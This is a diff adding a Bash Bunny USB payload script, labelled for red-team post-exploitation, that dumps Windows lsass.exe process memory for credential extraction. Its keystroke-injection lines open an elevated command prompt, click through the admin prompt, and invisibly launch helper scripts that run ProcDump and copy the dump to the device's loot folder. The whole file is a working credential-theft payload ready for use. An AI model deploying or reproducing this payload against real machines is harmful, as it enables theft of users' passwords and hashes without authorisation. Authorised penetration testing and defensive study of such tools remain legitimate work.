@@ -1,0 +1,38 @@
+#!/bin/bash
+#
+# Title:         1PumpDump
+# Author:        Anthony Siravo
+# Version:       1.0
+# Description:	 Payload utilizes ProcDump to dump lsass.exe process memory for post exploitation (mimicatz) after initial Red Team engagement.
+# Target:        Windows XP SP3+
+# Tested On:     Windows 10 Pro
+# Props:         Hak5Darren's many existing scripts and videos were main contributors
+# 
+# Prerequisites:
+# Windows Sysinternals ProcDump (procdump.exe) must be in Root of Bash Bunny drive
+# https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx
+#
+# Payload:
+# Launches cmd prompt as Administrator
+# Executes 1PumpHidden.cmd from the root of the Bash Bunny USB Disk partition,
+# which in turn executes 1PumpDump.cmd invisibly using iPump.vbs
+# which in turn copies dump to the loot folder on the Bash Bunny.
+#
+# Adjust DELAY Statements if Target Systems are Super Slow
+#
+# LED Mapping
+# Red LED - Payload Start
+# Blue LED - Payload Complete
+LED R
+ATTACKMODE HID STORAGE
+QUACK GUI r
+QUACK DELAY 100
+QUACK STRING powershell Start-Process cmd -Verb runAs
+QUACK ENTER
+QUACK DELAY 1000
+QUACK LEFT
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'1PumpHidden.cmd')"
+QUACK ENTER
+LED B
